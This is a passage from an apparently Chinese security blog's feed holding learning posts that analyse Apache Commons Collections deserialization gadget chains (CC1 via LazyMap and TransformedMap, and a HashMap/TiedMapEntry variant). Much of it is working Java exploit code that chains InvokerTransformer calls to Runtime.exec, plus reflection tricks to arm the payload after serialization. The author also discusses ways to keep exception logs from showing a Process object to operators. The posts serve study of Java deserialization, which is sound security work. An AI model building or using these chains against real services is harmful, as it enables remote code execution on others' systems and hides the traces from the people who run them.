ConstantTransformer(1));之前放的是ChainedTransformer c，从而触发链式RCE。现在我们修改lazyMap，使它的成员变量factory变成一个new ConstantTransformer(1)自然就不会RCE。</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先放进去一个触发不了的,避免序列化的时候触发</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 将factory重新赋值为lazyMap从而触发factory.transform</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>LazyMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field factory<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但显然这条链子打不通。</p><p>为了解决这个问题，debug断到LazyMap#get。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824200425348.png" alt="image-20220824200425348"></p><p>可以看到反序列化时我们走不到if里面，同样是因为hashmap.put提前触发了get，执行了map.put；也就导致此时的map存在这个key。</p><p>这也很好解决，在put完之后map.remove(“Squirt1e”);删掉这个key即可。</p><p>或者令TiedMapEntry tiedMapEntry&#x3D;new TiedMapEntry(map,”Squirt1e”);也就是说在put的时候不让他走到LazyMap#put，随后通过反射修改掉私有变量map也可以。不过也没啥大用，就图一乐。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先放进去一个触发不了的,避免序列化的时候触发</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">claz</span><span class="token operator">=</span>TiedMapEntry<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field tiedMap<span class="token operator">=</span>claz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMap<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span>lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将factory重新赋值为lazyMap从而触发factory.transform</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>LazyMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field factory<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashmap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824202059912.png" alt="image-20220824202059912"></p><h5 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h5><p>由于比较简单，就不调试了。</p><pre class="line-numbers language-java"><code class="language-java">HashMap#readobjectHashMap#hashTiedMapEntry#getValueLazyMap#getChainedTransformer#transformInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a> 白日梦组长</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1_LazyMap分析</title>
      <link href="/2021/12/11/cc1-lazymap/"/>
      <url>/2021/12/11/cc1-lazymap/</url>
      
        <content type="html"><![CDATA[<blockquote><p>上回讲到CC1中的TransformedMap#checksetValue调用ChainedTransformer#transform这条链子，这回学习LazyMap#get这条路。CC6也用到了LazyMap这条路，因此这条链子需要细品。</p></blockquote><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>从transform说起，上回CC1讲解到了通过ChainedTransformer链式调用从而实现RCE，我们的目的就是找谁调用ChainedTransformer#transform，如果类的实例一般都可以通过构造方法初始化，因此我们找谁调用了transform就可以了。</p><p>Find Usages，发现LazyMap#get方法调用了transform，如果map中不包含这个key，则调用；若包含，则return map.get(key)。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132756796.png" alt="image-20220823132756796" style="zoom: 67%;" /><p>与TransformedMap相同，LazyMap也是通过decorate方法实例化自身，factory我们传chainedTransformer就可以了，至于map我们先传一个空的。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132938918.png" alt="image-20220823132938918" style="zoom:67%;" /><p>前面不变，分析到这一步的exp为：</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//实例化LazyMap</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来找谁调用了LazyMap#get,我们可以看到AnnotationInvocationHandler#invoke调用了get，我们只需要把memberValues赋值lazyMap即可。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823135153801.png" alt="image-20220823135153801" style="zoom: 67%;" /><p>InvocationHandler接口是proxy代理实例的调用处理程序实现的一个接口，AnnotationInvocationHandler继承自InvocationHandler。简而言之我们需要通过Proxy代理AnnotationInvocationHandler的一个实例，只要这个代理调用了任意一个方法，那么就会触发AnnotationInvocationHandler#invoke，显然，这个被代理的实例的membervalue要赋值lazyMap。</p><p>为此，我们首先要实例化一个被代理的annotationInvocationHandler，接着要实例化一个annotationInvocationHandler用来把这个代理对象传进去。</p><p>链子：</p><pre class="line-numbers language-java"><code class="language-java">AnnotationInvocationHandler#readobject<span class="token function">Proxy</span><span class="token punctuation">(</span>AnnotationInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">.</span>xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>直接断到AnnotationInvocationHandler#invoke方法中的执行get处，</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141057434.png" alt="image-20220823141057434"  /><p>我们查看一下当前的几个重要变量。memberValues正是exp第一次实例化传入的LazyMap，var2是触发invoke的方法名称。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141307332.png" alt="image-20220823141307332"></p><p>回看AnnotationInvocationHandler#readObject，这里确实调用了entrySet()方法。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141449245.png" alt="image-20220823141449245"></p><p>跟进get方法，这里传来的key就是方法名entrySet，显然这个空map不存在这个key，因此执行transform。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141657649.png" alt="image-20220823141657649"></p><p>接着就走到了ChainedTransformer#transform链式调用InvokerTransformer从而RCE。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141853772.png" alt="image-20220823141853772"></p><p>RCE。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142035973.png" alt="image-20220823142035973"></p><h5 id="隐藏异常日志的思考"><a href="#隐藏异常日志的思考" class="headerlink" title="隐藏异常日志的思考"></a>隐藏异常日志的思考</h5><blockquote><p>个人思考，最后也没分析出为啥。</p></blockquote><p>细心的小伙伴儿会看到exp里的Transformer数组最后多处要给new ConstantTransformer(1),这是干啥用的？</p><p>先上结论：</p><p><strong>如果不加这一句，则报错：</strong></p><p><strong>Exception in thread “main” java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set</strong></p><p><strong>如果加上，则报错：</strong></p><p>**Exception in thread “main” java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set **</p><p>ProcessImpl是Process抽象类的实现类，运维人员一看，这块反序列化居然会出现Process这个进程类，肯定会排查。</p><p>可以看到链式调用执行完calc弹出计算器，此时object为ProcessImpl。这是因为getRuntime.exec()实际上就是调用ProcessBuilder.start()，而processImpl是被ProcessBuilder.start()这个方法进行创建的。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142210674.png" alt="image-20220823142210674"></p><p>而显然他还要接着触发ConstantTransformer(），从而返回1。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142559561.png" alt="image-20220823142559561"></p><p>LazyMap#get返回1。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142644704.png" alt="image-20220823142644704" style="zoom: 80%;" /><p>调试的过程中发现“Object var6 &#x3D; this.memberValues.get(var4);”get方法返回的var6居然是-1，百思不得其解。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823143749904.png" alt="image-20220823143749904" style="zoom: 80%;" /><p>而调到这里，再往下分析就直接跳到这里，报错。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823144630811.png" alt="image-20220823144630811"></p><p>往下分析到了ObjectStreamClass#invokeReadObject，可以看到动态代理调用invoke是通过ObjectStreamClass来调用的。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823145822137.png" alt="image-20220823145822137"></p><p>就是在这个方法抛出了异常。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823150146149.png" alt="image-20220823150146149"></p><p>至于他为啥会报这个，我怀疑是该invoke方法由entrySet()触发所以会报这个错误？</p><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a> 白日梦组长</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1利用链分析</title>
      <link href="/2021/12/05/cc1-li-yong-lian-fen-xi/"/>
      <url>/2021/12/05/cc1-li-yong-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>CC1很重要，需要去深挖。</p><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>漏洞点在于InvokerTransformer类的transform方法。可以调用该函数，以反射的形式调用任意方法，造成RCE。其中input是传进来的object。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>iMethodName<span class="token punctuation">,</span> iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//...略</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而iMethodName, iParamTypes, iArgs这三个参数是在构造方法中被赋值。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token function">InvokerTransformer</span><span class="token punctuation">(</span>String methodName<span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>        iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>        iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到该构造函数是可以实例化的，而transform也是public可以被对象调用。我们通过InvokerTransformer弹计算器。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Runtime r<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Runtime不是可序列化类，因此后续需要通过反射调用。</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而接下来我们要找哪个方法调用了InvokerTransformer#transform，通过IDEA的Find usages可以找到21处调用，接下来看transformedMap#checksetValue，protected类型。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> Object <span class="token function">checkSetValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而valueTransformer是在构造方法中赋值。可以看到构造方法也是protected类型，因此还要通过类中方法调用。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token function">TransformedMap</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token 